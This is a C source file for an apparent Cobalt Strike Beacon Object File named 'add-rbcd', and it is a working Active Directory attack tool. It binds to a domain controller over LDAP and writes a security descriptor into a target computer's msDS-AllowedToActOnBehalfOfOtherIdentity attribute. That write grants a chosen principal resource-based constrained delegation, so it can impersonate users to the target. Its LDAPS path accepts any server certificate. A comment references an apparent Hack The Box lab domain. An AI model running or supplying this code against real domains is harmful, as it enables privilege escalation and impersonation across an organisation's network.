#include <windows.h>
#include <sddl.h>
#include "beacon.h"

struct l_timeval;  // opaque fwd decl

// ── Minimal LDAP types ───────────────────────────────────────────────────────
typedef struct ldap {
    struct {
        UINT_PTR sb_sd;
        UCHAR Reserved1[(10*sizeof(ULONG))+1];
        ULONG_PTR sb_naddr;
        UCHAR Reserved2[(6*sizeof(ULONG))];
    } ld_sb;
    PCHAR ld_host; ULONG ld_version; UCHAR ld_lberoptions;
    ULONG ld_deref; ULONG ld_timelimit; ULONG ld_sizelimit; ULONG ld_errno;
    PCHAR ld_matched; PCHAR ld_error; ULONG ld_msgid;
    UCHAR Reserved3[(6*sizeof(ULONG))+1];
    ULONG ld_cldaptries; ULONG ld_cldaptimeout; ULONG ld_refhoplimit; ULONG ld_options;
} LDAP, *PLDAP;

typedef struct berval { ULONG bv_len; PCHAR bv_val; } BERVAL, *PBERVAL;

typedef struct ldapmodA {
    ULONG mod_op; PCHAR mod_type;
    union { PCHAR *modv_strvals; struct berval **modv_bvals; } mod_vals;
} LDAPModA;

typedef struct ldapmsg {
    ULONG lm_msgid; ULONG lm_msgtype; PVOID lm_ber;
    struct ldapmsg* lm_chain; struct ldapmsg* lm_next;
    ULONG lm_time; LDAP* Connection; PVOID Request;
    ULONG lm_returncode; USHORT lm_referral;
    BOOLEAN lm_chased; BOOLEAN lm_eom; BOOLEAN ConnectionReferenced;
} LDAPMessage;

// ── Constants ────────────────────────────────────────────────────────────────
#define LDAP_OPT_REFERRALS          0x08
#define LDAP_OPT_REFERRALS          0x08
#define LDAP_PORT                   389
#define LDAP_SSL_PORT               636
#define LDAP_VERSION3               3
#define LDAP_SUCCESS                0x00
#define LDAP_INSUFFICIENT_RIGHTS    0x32
#define LDAP_NO_SUCH_OBJECT         0x20
#define LDAP_OPT_VERSION            0x11
#define LDAP_OPT_SSL                0x0a
#define LDAP_OPT_SIGN               0x95
#define LDAP_OPT_ENCRYPT            0x96
#define LDAP_OPT_SERVER_CERTIFICATE 0x81
#define LDAP_OPT_AREC_EXCLUSIVE     0x98
#define LDAP_OPT_ON                 ((void*)1)
#define LDAP_MOD_REPLACE            0x02
#define LDAP_MOD_BVALUES            0x80
#define LDAP_SCOPE_BASE             0x00
#define LDAP_SCOPE_SUBTREE          0x02
#define LDAP_AUTH_NEGOTIATE         0x0486
#define LDAP_AUTH_KERBEROS          0x0800

// ── Imports ──────────────────────────────────────────────────────────────────
DECLSPEC_IMPORT LDAP*  WLDAP32$ldap_init(PCHAR, ULONG);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_set_option(LDAP*, int, const void*);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_bind_s(LDAP*, const PCHAR, const PCHAR, ULONG);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_unbind_s(LDAP*);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_modify_s(LDAP*, const PCHAR, LDAPModA**);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_search_s(LDAP*, const PCHAR, ULONG, const PCHAR, PCHAR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT LDAPMessage* WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PCHAR* WLDAP32$ldap_get_values(LDAP*, LDAPMessage*, const PCHAR);
DECLSPEC_IMPORT struct berval** WLDAP32$ldap_get_values_len(LDAP*, LDAPMessage*, const PCHAR);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_value_free(PCHAR*);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_value_free_len(struct berval**);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT PCHAR  WLDAP32$ldap_err2stringA(ULONG);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_connect(LDAP*, struct l_timeval*);

DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char*);
DECLSPEC_IMPORT char*  __cdecl MSVCRT$strcpy(char*, const char*);
DECLSPEC_IMPORT int    __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void*);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memcpy(void*, const void*, size_t);

DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
    LPCSTR, DWORD, PSECURITY_DESCRIPTOR*, PULONG);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);

typedef BOOLEAN (*VERIFYSERVERCERT)(PLDAP, PCCERT_CONTEXT);
BOOLEAN _cert_cb(PLDAP c, PCCERT_CONTEXT p) { return TRUE; }

// ── Build DC=x,DC=y from dc01.garfield.htb ──────────────────────────────────
char* _build_nc(const char* dc_fqdn) {
    if (!dc_fqdn || !MSVCRT$strlen(dc_fqdn)) return NULL;
    const char* p = dc_fqdn;
    while (*p && *p != '.') p++;
    if (!*p) return NULL;
    p++;
    int dots = 0; const char* q = p;
    while (*q) { if (*q == '.') dots++; q++; }
    size_t domlen = MSVCRT$strlen(p);
    char* nc = (char*)MSVCRT$malloc(domlen + (dots + 1) * 4 + 1);
    if (!nc) return NULL;
    char* w = nc; const char* r = p; int first = 1;
    while (*r) {
        if (!first) *w++ = ',';
        first = 0;
        *w++ = 'D'; *w++ = 'C'; *w++ = '=';
        while (*r && *r != '.') *w++ = *r++;
        if (*r == '.') r++;
    }
    *w = '\0';
    return nc;
}

// ── Strip trailing $ (for display/filter purposes) ──────────────────────────
void _strip_dollar(const char* in, char* out, size_t outsz) {
    size_t n = MSVCRT$strlen(in);
    if (n && in[n-1] == '$') n--;
    if (n >= outsz) n = outsz - 1;
    for (size_t i = 0; i < n; i++) out[i] = in[i];
    out[n] = '\0';
}

// ── Find object: returns DN (always) and optionally objectSid ───────────────
// Takes either a bare name, name$, or full DN. If it looks like a DN (contains
// "=" and a "," or starts with "CN="/"OU="), does a BASE read; otherwise
// searches subtree by (sAMAccountName=X|X$)(cn=X).
// ── Resolve a name/DN to DN only (no SID) ──────────────────────────────────
char* _resolve_dn(LDAP* ld, const char* base, const char* ident) {
    int looks_like_dn = 0;
    if (MSVCRT$strlen(ident) > 3) {
        if ((ident[0]=='C'||ident[0]=='c') && (ident[1]=='N'||ident[1]=='n') && ident[2]=='=') looks_like_dn = 1;
        if ((ident[0]=='O'||ident[0]=='o') && (ident[1]=='U'||ident[1]=='u') && ident[2]=='=') looks_like_dn = 1;
    }

    char* attrs[] = { "distinguishedName", NULL };
    LDAPMessage* res = NULL;
    ULONG r;

    if (looks_like_dn) {
        r = WLDAP32$ldap_search_s(ld, (PCHAR)ident, LDAP_SCOPE_BASE,
                                  "(objectClass=*)", attrs, 0, &res);
    } else {
        char bare[256];
        _strip_dollar(ident, bare, sizeof(bare));
        char filter[1024];
        MSVCRT$_snprintf(filter, sizeof(filter),
            "(|(sAMAccountName=%s)(sAMAccountName=%s$)(cn=%s))",
            bare, bare, bare);
        r = WLDAP32$ldap_search_s(ld, (PCHAR)base, LDAP_SCOPE_SUBTREE,
                                  filter, attrs, 0, &res);
    }

    if (r != LDAP_SUCCESS) {
        PCHAR es = WLDAP32$ldap_err2stringA(r);
        BeaconPrintf(CALLBACK_ERROR, "[-] resolve '%s' failed (0x%x): %s",
                     ident, r, es ? es : "?");
        if (res) WLDAP32$ldap_msgfree(res);
        return NULL;
    }

    char* dn = NULL;
    LDAPMessage* e = WLDAP32$ldap_first_entry(ld, res);
    if (e) {
        char** dnv = WLDAP32$ldap_get_values(ld, e, "distinguishedName");
        if (dnv && dnv[0]) {
            size_t len = MSVCRT$strlen(dnv[0]) + 1;
            dn = (char*)MSVCRT$malloc(len);
            if (dn) MSVCRT$strcpy(dn, dnv[0]);
            WLDAP32$ldap_value_free(dnv);
        }
    }
    WLDAP32$ldap_msgfree(res);
    return dn;
}

// ── Fetch objectSid from a known DN via BASE read ───────────────────────────
int _fetch_sid(LDAP* ld, const char* dn, PSID* out_sid, ULONG* out_sid_len) {
    *out_sid = NULL; *out_sid_len = 0;

    char* attrs[] = { "objectSid", NULL };
    LDAPMessage* res = NULL;
    ULONG r = WLDAP32$ldap_search_s(ld, (PCHAR)dn, LDAP_SCOPE_BASE,
                                     "(objectClass=*)", attrs, 0, &res);
    if (r != LDAP_SUCCESS) {
        PCHAR es = WLDAP32$ldap_err2stringA(r);
        BeaconPrintf(CALLBACK_ERROR, "[-] SID read for '%s' failed (0x%x): %s",
                     dn, r, es ? es : "?");
        if (res) WLDAP32$ldap_msgfree(res);
        return 0;
    }

    LDAPMessage* e = WLDAP32$ldap_first_entry(ld, res);
    if (!e) { WLDAP32$ldap_msgfree(res); return 0; }

    struct berval** sv = WLDAP32$ldap_get_values_len(ld, e, "objectSid");
    if (sv && sv[0]) {
        *out_sid = (PSID)MSVCRT$malloc(sv[0]->bv_len);
        if (*out_sid) {
            MSVCRT$memcpy(*out_sid, sv[0]->bv_val, sv[0]->bv_len);
            *out_sid_len = sv[0]->bv_len;
        }
        WLDAP32$ldap_value_free_len(sv);
    }
    WLDAP32$ldap_msgfree(res);
    return (*out_sid != NULL);
}

// ── Main ─────────────────────────────────────────────────────────────────────
void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* targetArg    = BeaconDataExtract(&parser, NULL);
    int   isTargetDN   = BeaconDataInt(&parser);
    char* principalArg = BeaconDataExtract(&parser, NULL);
    int   isPrincipalDN= BeaconDataInt(&parser);
    char* searchOu     = BeaconDataExtract(&parser, NULL);
    char* dcFqdn       = BeaconDataExtract(&parser, NULL);
    int   useLdaps     = BeaconDataInt(&parser);

    if (!targetArg || !MSVCRT$strlen(targetArg)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] target required"); return;
    }
    if (!principalArg || !MSVCRT$strlen(principalArg)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] principal required"); return;
    }
    if (!dcFqdn || !MSVCRT$strlen(dcFqdn)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DC FQDN required"); return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] add-rbcd: target=%s principal=%s DC=%s",
                 targetArg, principalArg, dcFqdn);

    // ── Connect ──────────────────────────────────────────────────────────────
    LDAP* ld = NULL;
    int on_ldaps = 0;
    if (useLdaps) {
        ld = WLDAP32$ldap_init((PCHAR)dcFqdn, LDAP_SSL_PORT);
        if (ld) {
            ULONG ver = LDAP_VERSION3;
            WLDAP32$ldap_set_option(ld, LDAP_OPT_VERSION, &ver);
            ULONG ref_off = 0;
	    WLDAP32$ldap_set_option(ld, LDAP_OPT_REFERRALS, &ref_off);
            WLDAP32$ldap_set_option(ld, LDAP_OPT_AREC_EXCLUSIVE, LDAP_OPT_ON);
            WLDAP32$ldap_set_option(ld, LDAP_OPT_SSL, LDAP_OPT_ON);
            VERIFYSERVERCERT cb = _cert_cb;
            WLDAP32$ldap_set_option(ld, LDAP_OPT_SERVER_CERTIFICATE, (void*)&cb);
            ULONG cr = WLDAP32$ldap_connect(ld, NULL);
            if (cr == LDAP_SUCCESS) { on_ldaps = 1; }
            else { WLDAP32$ldap_unbind_s(ld); ld = NULL;
                   BeaconPrintf(CALLBACK_OUTPUT, "[!] LDAPS failed (0x%x), falling back to 389", cr); }
        }
    }
    if (!ld) {
        ld = WLDAP32$ldap_init((PCHAR)dcFqdn, LDAP_PORT);
        if (!ld) { BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed"); return; }
        ULONG ver = LDAP_VERSION3;
        WLDAP32$ldap_set_option(ld, LDAP_OPT_VERSION, &ver);
        ULONG ref_off = 0;
	WLDAP32$ldap_set_option(ld, LDAP_OPT_REFERRALS, &ref_off);
        WLDAP32$ldap_set_option(ld, LDAP_OPT_AREC_EXCLUSIVE, LDAP_OPT_ON);
        ULONG on_val = 1;
        WLDAP32$ldap_set_option(ld, LDAP_OPT_SIGN,    &on_val);
        WLDAP32$ldap_set_option(ld, LDAP_OPT_ENCRYPT, &on_val);
        ULONG cr = WLDAP32$ldap_connect(ld, NULL);
        if (cr != LDAP_SUCCESS) {
            PCHAR es = WLDAP32$ldap_err2stringA(cr);
            BeaconPrintf(CALLBACK_ERROR, "[-] ldap_connect failed (0x%x): %s", cr, es ? es : "?");
            WLDAP32$ldap_unbind_s(ld); return;
        }
    }

    // ── Bind ─────────────────────────────────────────────────────────────────
    ULONG rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_KERBEROS);
    if (rc != LDAP_SUCCESS) rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_SUCCESS) {
        PCHAR es = WLDAP32$ldap_err2stringA(rc);
        BeaconPrintf(CALLBACK_ERROR, "[-] bind failed (0x%x): %s", rc, es ? es : "?");
        WLDAP32$ldap_unbind_s(ld); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] bind OK (%s)", on_ldaps ? "LDAPS" : "SASL sign+seal");

    // ── Derive NC / base ─────────────────────────────────────────────────────
    char* defaultNC = _build_nc(dcFqdn);
    const char* base = (searchOu && MSVCRT$strlen(searchOu)) ? searchOu : defaultNC;
    if (!base) {
        BeaconPrintf(CALLBACK_ERROR, "[-] could not derive search base");
        WLDAP32$ldap_unbind_s(ld); return;
    }

// ── Resolve target DN ────────────────────────────────────────────────────
    char* targetDN = NULL;
    if (isTargetDN) {
        size_t len = MSVCRT$strlen(targetArg) + 1;
        targetDN = (char*)MSVCRT$malloc(len);
        if (targetDN) MSVCRT$strcpy(targetDN, targetArg);
    } else {
        targetDN = _resolve_dn(ld, base, targetArg);
    }
    if (!targetDN) {
        BeaconPrintf(CALLBACK_ERROR, "[-] target '%s' not resolved", targetArg);
        if (defaultNC) MSVCRT$free(defaultNC);
        WLDAP32$ldap_unbind_s(ld); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] target DN: %s", targetDN);

    // ── Resolve principal DN ─────────────────────────────────────────────────
    char* principalDN = NULL;
    if (isPrincipalDN) {
        size_t len = MSVCRT$strlen(principalArg) + 1;
        principalDN = (char*)MSVCRT$malloc(len);
        if (principalDN) MSVCRT$strcpy(principalDN, principalArg);
    } else {
        principalDN = _resolve_dn(ld, defaultNC ? defaultNC : base, principalArg);
    }
    if (!principalDN) {
        BeaconPrintf(CALLBACK_ERROR, "[-] principal '%s' not resolved", principalArg);
        MSVCRT$free(targetDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        WLDAP32$ldap_unbind_s(ld); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] principal DN: %s", principalDN);

    // ── Fetch principal SID via direct BASE read on its DN ──────────────────
    PSID  principalSid = NULL;
    ULONG principalSidLen = 0;
    if (!_fetch_sid(ld, principalDN, &principalSid, &principalSidLen)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] could not read objectSid for principal");
        MSVCRT$free(principalDN); MSVCRT$free(targetDN);
        if (defaultNC) MSVCRT$free(defaultNC);
        WLDAP32$ldap_unbind_s(ld); return;
    }

    // ── SID to string ────────────────────────────────────────────────────────
    LPSTR sidStr = NULL;
    if (!ADVAPI32$ConvertSidToStringSidA(principalSid, &sidStr) || !sidStr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ConvertSidToStringSidA failed");
        MSVCRT$free(principalSid); MSVCRT$free(principalDN);
        MSVCRT$free(targetDN); if (defaultNC) MSVCRT$free(defaultNC);
        WLDAP32$ldap_unbind_s(ld); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] principal SID: %s", sidStr);

    // ── Build SDDL → self-relative SD ────────────────────────────────────────
    // Owner = Builtin Administrators; DACL = one Allow/GenericAll ACE for principal
    char sddl[512];
    MSVCRT$_snprintf(sddl, sizeof(sddl), "O:BAD:(A;;0xF01FF;;;%s)", sidStr);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] SDDL: %s", sddl);

    PSECURITY_DESCRIPTOR pSD = NULL;
    ULONG sdLen = 0;
    if (!ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorA(
            sddl, SDDL_REVISION_1, &pSD, &sdLen) || !pSD) {
        BeaconPrintf(CALLBACK_ERROR, "[-] SDDL -> SD conversion failed");
        KERNEL32$LocalFree(sidStr);
        MSVCRT$free(principalSid); MSVCRT$free(principalDN);
        MSVCRT$free(targetDN); if (defaultNC) MSVCRT$free(defaultNC);
        WLDAP32$ldap_unbind_s(ld); return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] built SD (%lu bytes, self-relative)", sdLen);

    // ── ldap_modify_s REPLACE msDS-AllowedToActOnBehalfOfOtherIdentity ──────
    BERVAL sdBv;
    sdBv.bv_len = sdLen;
    sdBv.bv_val = (char*)pSD;
    BERVAL* vals[] = { &sdBv, NULL };

    LDAPModA mod;
    mod.mod_op   = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type = "msDS-AllowedToActOnBehalfOfOtherIdentity";
    mod.mod_vals.modv_bvals = vals;
    LDAPModA* mods[] = { &mod, NULL };

    rc = WLDAP32$ldap_modify_s(ld, targetDN, mods);
    if (rc == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] RBCD written successfully");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s can now impersonate to %s", principalDN, targetDN);

        // Verify read-back
        char* vattrs[] = { "msDS-AllowedToActOnBehalfOfOtherIdentity", NULL };
        LDAPMessage* vres = NULL;
        if (WLDAP32$ldap_search_s(ld, targetDN, LDAP_SCOPE_BASE, "(objectClass=*)",
                                  vattrs, 0, &vres) == LDAP_SUCCESS) {
            LDAPMessage* ve = WLDAP32$ldap_first_entry(ld, vres);
            if (ve) {
                struct berval** vv = WLDAP32$ldap_get_values_len(ld, ve,
                    "msDS-AllowedToActOnBehalfOfOtherIdentity");
                if (vv && vv[0]) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] verification: attribute present (%lu bytes)",
                                 vv[0]->bv_len);
                    WLDAP32$ldap_value_free_len(vv);
                } else {
                    BeaconPrintf(CALLBACK_OUTPUT, "[!] verification: attribute empty after write!");
                }
            }
            WLDAP32$ldap_msgfree(vres);
        }
    } else {
        PCHAR es = WLDAP32$ldap_err2stringA(rc);
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_modify_s failed (0x%x): %s", rc, es ? es : "?");
        if (rc == LDAP_INSUFFICIENT_RIGHTS)
            BeaconPrintf(CALLBACK_ERROR, "[!] no WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity");
        if (rc == LDAP_NO_SUCH_OBJECT)
            BeaconPrintf(CALLBACK_ERROR, "[!] target DN doesn't exist");
    }

    // ── Cleanup ──────────────────────────────────────────────────────────────
    KERNEL32$LocalFree(pSD);
    KERNEL32$LocalFree(sidStr);
    MSVCRT$free(principalSid);
    MSVCRT$free(principalDN);
    MSVCRT$free(targetDN);
    if (defaultNC) MSVCRT$free(defaultNC);
    WLDAP32$ldap_unbind_s(ld);
}
